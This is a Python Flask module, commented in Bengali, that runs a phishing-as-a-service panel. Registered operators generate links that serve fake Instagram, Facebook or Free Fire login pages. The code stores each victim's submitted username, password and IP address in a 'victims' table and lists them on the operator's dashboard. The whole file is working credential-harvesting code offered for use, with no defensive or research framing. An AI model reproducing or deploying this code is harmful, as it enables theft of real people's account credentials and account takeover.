# -*- coding: utf-8 -*-
import os
import uuid
import sqlite3
from datetime import datetime, timedelta
from flask import Blueprint, render_template, request, redirect, session, jsonify, current_app

# ==================== ব্লুপ্রিন্ট তৈরি ====================
bp = Blueprint('phis', __name__, url_prefix='/phis')

# ==================== ডেটাবেস কনফিগ ====================
# Render-এ /tmp রাইটেবল, তাই সেখানে ডিবি রাখি
DB_NAME = '/tmp/phish_data.db'

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        link_id TEXT UNIQUE,
        template TEXT,
        created_at TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users (id)
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        link_id TEXT,
        username TEXT,
        password TEXT,
        ip TEXT,
        submitted_at TIMESTAMP,
        FOREIGN KEY (link_id) REFERENCES links (link_id)
    )''')
    conn.commit()
    conn.close()

# অ্যাপ স্টার্ট হলে ডিবি তৈরি হবে (main.py-তে একবার কল করতে হবে)
# আমরা main.py-তে init_db() কল করব, অথবা এখানে প্রথম রিকোয়েস্টে চেক করব।
# তবে সুবিধার জন্য আমরা একটি ফ্ল্যাগ রাখি – কিন্তু এখানে ফাংশন ডিফাইন করলাম।

# ==================== হোম ====================
@bp.route('/')
def home():
    if 'user_id' in session:
        return redirect('/phis/dashboard')
    return redirect('/phis/login')

# ==================== রেজিস্টার ====================
@bp.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        try:
            c.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))
            conn.commit()
            conn.close()
            return redirect('/phis/login')
        except sqlite3.IntegrityError:
            conn.close()
            return "Username already exists. <a href='/phis/register'>Try again</a>"
    return render_template('register.html')

# ==================== লগইন ====================
@bp.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        session.permanent = True
        username = request.form['username']
        password = request.form['password']
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("SELECT id FROM users WHERE username=? AND password=?", (username, password))
        user = c.fetchone()
        conn.close()
        if user:
            session['user_id'] = user[0]
            session['username'] = username
            return redirect('/phis/dashboard')
        else:
            # ❌ এরর মেসেজ টেমপ্লেটে পাঠানো হচ্ছে
            return render_template('login.html', error="Invalid username or password. Please try again.")
    return render_template('login.html', error=None)

# ==================== লগআউট ====================
@bp.route('/logout')
def logout():
    session.clear()
    return redirect('/phis/login')

# ==================== ড্যাশবোর্ড ====================
@bp.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect('/phis/login')
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT link_id, template, created_at FROM links WHERE user_id=?", (session['user_id'],))
    links = [{'link_id': row[0], 'template': row[1], 'created_at': row[2]} for row in c.fetchall()]
    conn.close()
    host_url = request.host_url.rstrip('/')  # হোস্ট URL (প্রোটোকল + ডোমেইন)
    return render_template('dashboard.html', user=session['username'], links=links, host_url=host_url)

# ==================== লিংক তৈরি ====================
@bp.route('/create_link', methods=['GET', 'POST'])
def create_link():
    if 'user_id' not in session:
        return redirect('/phis/login')
    if request.method == 'POST':
        template = request.form['template']
        link_id = str(uuid.uuid4())[:8]
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("INSERT INTO links (user_id, link_id, template, created_at) VALUES (?, ?, ?, ?)",
                  (session['user_id'], link_id, template, datetime.now()))
        conn.commit()
        conn.close()
        return redirect('/phis/dashboard')
    return render_template('create_link.html')

# ==================== ফিশিং পেজ (ভিকটিমদের জন্য) ====================
@bp.route('/f/<link_id>', methods=['GET', 'POST'])
def phish_page(link_id):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    
    c.execute("SELECT template FROM links WHERE link_id=?", (link_id,))
    result = c.fetchone()
    if not result:
        conn.close()
        return "Invalid link", 404
    
    template_name = result[0]
    
    if request.method == 'POST':
        try:
            username = request.form.get('username', '').strip()
            password = request.form.get('password', '').strip()
            ip = request.remote_addr
            
            if not username or not password:
                return jsonify({"status": "error", "message": "All fields required"}), 400
            
            c.execute("INSERT INTO victims (link_id, username, password, ip, submitted_at) VALUES (?,?,?,?,?)",
                      (link_id, username, password, ip, datetime.now()))
            conn.commit()
            conn.close()
            return jsonify({"status": "success", "message": "Information saved"})
        
        except Exception as e:
            conn.rollback()
            conn.close()
            return jsonify({"status": "error", "message": str(e)}), 500
    
    conn.close()
    
    if template_name == 'instagram':
        return render_template('instagram.html')
    elif template_name == 'facebook':
        return render_template('facebook.html')
    elif template_name == 'freefire':
        return render_template('freefire.html')
    else:
        return "Invalid template", 400

# ==================== শিকারিদের তালিকা ====================
@bp.route('/victims/<link_id>')
def view_victims(link_id):
    if 'user_id' not in session:
        return redirect('/phis/login')
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT user_id FROM links WHERE link_id=?", (link_id,))
    owner = c.fetchone()
    if not owner or owner[0] != session['user_id']:
        conn.close()
        return "Unauthorized", 403
    c.execute("SELECT username, password, ip, submitted_at FROM victims WHERE link_id=? ORDER BY submitted_at DESC", (link_id,))
    victims = [{'username': row[0], 'password': row[1], 'ip': row[2], 'submitted_at': row[3]} for row in c.fetchall()]
    conn.close()
    return render_template('victims.html', link_id=link_id, victims=victims)

# ==================== লিংক ডিলিট ====================
@bp.route('/delete_link/<link_id>')
def delete_link(link_id):
    if 'user_id' not in session:
        return redirect('/phis/login')
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT user_id FROM links WHERE link_id=?", (link_id,))
    owner = c.fetchone()
    if not owner or owner[0] != session['user_id']:
        conn.close()
        return "Unauthorized", 403
    c.execute("DELETE FROM victims WHERE link_id=?", (link_id,))
    c.execute("DELETE FROM links WHERE link_id=?", (link_id,))
    conn.commit()
    conn.close()
    return redirect('/phis/dashboard')
